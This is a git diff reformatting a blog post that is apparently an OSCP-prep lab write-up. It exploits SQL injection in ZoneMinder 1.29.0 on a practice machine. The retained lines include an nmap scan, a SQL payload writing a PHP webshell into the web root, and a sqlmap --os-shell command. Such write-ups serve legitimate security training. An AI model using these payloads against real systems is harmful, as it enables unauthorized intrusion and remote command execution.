@@ -1,7 +1,7 @@
 ---
 layout: /src/layouts/PostLayout.astro
-title: Lavita
-tags: []
+title: Pebbles
+tags: ["SQLi", "burpsuite", "ZoneMinder" ]
 ---
 **Start 19:38 02-01-2025**
 
@@ -10,9 +10,9 @@ tags: []
 Scope:
 192.168.115.52
 ```
-# Recon
+## Recon
 
-## Nmap
+### Nmap
 
 ```bash
 sudo nmap -sC -sV -oN nmap 192.168.115.52 -T5 -vvvv --min-rate=5000 -sT -p-
@@ -49,9 +49,9 @@ On port 21 there's an FTP server that does *NOT* allow anonymous bind.
 Let's check out port 80 for now.
 
 
-# Initial Foothold
+## Initial Foothold
 
-## 80/TCP - HTTP
+### 80/TCP - HTTP
 
 I went to the website and found the following:
 
@@ -101,10 +101,10 @@ SELECT "<?php system($_GET['cmd']);?>" INTO OUTFILE "/var/www/html/webshell.phpâ
 
 ![](../../../assets/2cf75126a4b8444151b4476edee89545.png)
 
->[!fail]
->This approach ultimately kept on failing for whatever reason and thus I decided to use SQLmap.
->![](../../../assets/bd9a56d04016103736b3368305fa0593.png)
-
+:::fail
+This approach ultimately kept on failing for whatever reason and thus I decided to use SQLmap.
+![](../../../assets/bd9a56d04016103736b3368305fa0593.png)
+:::
 
 ### SQLmap - Automated Exploitation
 
@@ -114,11 +114,13 @@ I went ahead and launched `sqlmap` and let it do it's thing for a while:
 sqlmap http://192.168.115.52/zm/index.php --data="view=request&request=log&task=query&limit=100&minTime=5" --os-shell
 ```
 
->[!note]
->Eventhough automated  SQL tools are *NOT* allowed on the exam, OffSec still encourages to use sqlmap for this machine.
+:::note
+Eventhough automated  SQL tools are *NOT* allowed on the exam, OffSec still encourages to use sqlmap for this machine.
+:::
 
->[!fail] 
->This also just kept on failing, I looked everywhere and could not understand why as everyone else just got a shell, but for me the `> os-shell` only kept returning `No output`.
+:::fail 
+This also just kept on failing, I looked everywhere and could not understand why as everyone else just got a shell, but for me the `> os-shell` only kept returning `No output`.
+:::
 
 I then slightly modified the POST request and retested it and found out that this time it did work, the shell however is painfully slow.
 
@@ -152,11 +154,12 @@ So since this didn't work I just decided to use `cat /root/proof.txt` in order t
 ![](../../../assets/81e3169a6097deff5d2d152cf6000d25.png)
 
 
->[!summary]
->1) We found a **ZoneMinder** console of version 1.29.0 which was vulnerable to SQLi
->2) We tried manually exploiting it with no luck
->3) We also exploited it using `sqlmap` 
->4) We were *NOT* able to get a reverse shell via `sqlmap` for unknown reasons
+:::summary
+1) We found a **ZoneMinder** console of version 1.29.0 which was vulnerable to SQLi
+2) We tried manually exploiting it with no luck
+3) We also exploited it using `sqlmap` 
+4) We were *NOT* able to get a reverse shell via `sqlmap` for unknown reasons
+:::
 
 ---
 
@@ -164,4 +167,3 @@ So since this didn't work I just decided to use `cat /root/proof.txt` in order t
 
 [^Links]: [[OSCP Prep]] 
 
-#SQLi #burpsuite #ZoneMinder 
